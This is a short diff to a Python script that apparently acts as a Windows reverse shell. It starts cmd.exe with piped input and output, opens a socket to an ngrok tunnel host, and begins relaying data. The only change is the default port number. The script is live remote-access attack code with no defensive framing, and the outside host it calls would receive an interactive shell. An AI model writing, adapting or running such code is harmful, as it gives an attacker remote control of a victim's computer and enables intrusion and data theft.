@@ -1,7 +1,7 @@
 import socket,os as os,threading
 import subprocess as sp
 
-def run(host:str="0.tcp.in.ngrok.io:14914", port:int=14914):
+def run(host:str="0.tcp.in.ngrok.io:14914", port:int=15320):
     p=sp.Popen(['cmd.exe'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT)
     s=socket.socket();s.connect((host,port))
     def c2s():
